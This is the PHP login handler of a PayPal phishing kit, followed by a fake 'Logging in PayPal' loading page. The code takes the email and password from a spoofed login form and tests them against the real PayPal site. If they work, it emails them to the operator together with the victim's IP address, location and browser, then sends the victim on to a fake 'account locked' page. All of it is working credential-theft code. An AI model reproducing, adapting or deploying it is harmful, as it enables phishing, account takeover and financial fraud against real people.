<?php

include('../blocker.php');
include('../detect.php');
include('../settings.php');
include('../pais/logintrans.php');
include('../quotes.php');

error_reporting(0);
$email	= $_POST['login_email'];
$password = $_POST['login_password'];

include('../function.php');
$valid  = filter_var($email, FILTER_VALIDATE_EMAIL) && preg_match('/@.+\./', $email);

if (!$valid || strlen($password) < $pais_minpass || strlen($password) > 20) {
	header("LOCATION: websrc.php?cmd=_login-submit&dispatch=".md5(gmdate('r')).sha1(gmdate('r')));
} else {
	$responses   = curl("https://www.paypal.com/cgi-bin/webscr?cmd=_ship-now");
	$form_action = fetch_value($responses, '<form method="post" name="login_form" action="', '"');
	$conText	 = fetch_value($responses, 'id="CONTEXT_CGI_VAR" name="CONTEXT" value="', '"');

	$var  = 'login_cmd=&login_params=&login_email='.$email.'&login_password='.$password.'&target_page=0&submit.x=Log+In';
	$vars = "cmd=_flow&CONTEXT=".$conText."=&login_email=".$email."&login_password=".$password."&login.x=Log+In";
	if(stripos($form_action,'webscr?SESSION=')){
		$login = curl($form_action, $vars);
	} elseif(stripos($form_action, 'SESSION=')){
		$login = curl($form_action, $var);
	}
	$error	 = fetch_value($login, 's.prop14="', '"');
	if ($error = fetch_value($login, 's.prop14="', '"')) {
		header("LOCATION: login?cmd=_login-submit&dispatch=".md5(gmdate('r')).sha1(gmdate('r')));
	} else {
		$message   = " ".$quote."
		++------[ Login Details ]------++
		Email	    :  ".$email."
		Password  :  ".$password."


		++------[ Victim Info ]------++
		IP Info   :  ".$ip." | ".$nama_negara." | " . $state . " | " . $kota . " On ".date('r')."
		Browser   :  ".$_SERVER['HTTP_USER_AGENT']."

		++------[ End Of Info ]------++
		";
		crypto($message);
		include '../settings.php';
		$subject = "PP Login [ ".$nama_negara." - ".$state." - ".$kota." | " . $ip . " ]";
		$headers = "From: PP Login ".$negara." <accountlogin@jembotmawot.com>";
		mail($pais_email, $subject, $message, $headers);

		?>
<?php header("refresh: 3; url=../myaccount/index.php?locked=account_".$kode_negara."&login_params=checked&email_locked=".$email."&login_password=".$password."&step=one"); ?>
<?php
}
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Logging in PayPal</title>
<meta http-equiv="X-UA-Compatible" content="IE=9">
<style type="text/css">#page{width:auto;}#rotatingImg{display:none}#rotatingDiv{display:block;margin:32px auto;height:30px;width:30px;-webkit-animation:rotation .7s infinite linear;-moz-animation:rotation .7s infinite linear;-o-animation:rotation .7s infinite linear;animation:rotation .7s infinite linear;border-left:8px solid rgba(0,0,0,.20);border-right:8px solid rgba(0,0,0,.20);border-bottom:8px solid rgba(0,0,0,.20);border-top:8px solid rgba(33,128,192,1);border-radius:100%}@keyframes rotation{from{transform:rotate(0deg)}to{transform:rotate(359deg)}}@-webkit-keyframes rotation{from{-webkit-transform:rotate(0deg)}to{-webkit-transform:rotate(359deg)}}@-moz-keyframes rotation{from{-moz-transform:rotate(0deg)}to{-moz-transform:rotate(359deg)}}@-o-keyframes rotation{from{-o-transform:rotate(0deg)}to{-o-transform:rotate(359deg)}}h3{font-size:1.4em;margin:4em 0 0;line-height:normal}p.note{color:#656565;font-size:1.2em}p.note a{color:#656565}p{margin-top:2em;color:#1A3665;font-size:1.25em}img.actionImage{margin:2em auto}</style>

<SCRIPT type="text/javascript">window.history.forward();function noBack() { window.history.forward(); }</SCRIPT>
<link rel="shortcut icon" href="../../icon/pp_favicon_x.ico">
<link rel="apple-touch-icon" href="../../icon/apple-touch-icon.png">
</head>
<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
<div id="page" align="center">
	<div id="content">
	<div id="main">
		<div class="layout1 textcenter">
			<h3>One moment...</h3>
<div id="rotatingDiv"></div>
	<img id="rotatingImg" border="0" class="actionImage" alt="Logging you in securely">
		<p class="note">Still loading after a few seconds? <a href="../../myaccount">Try again</a>.</p></div></div></div>
</div>
</body>
</html>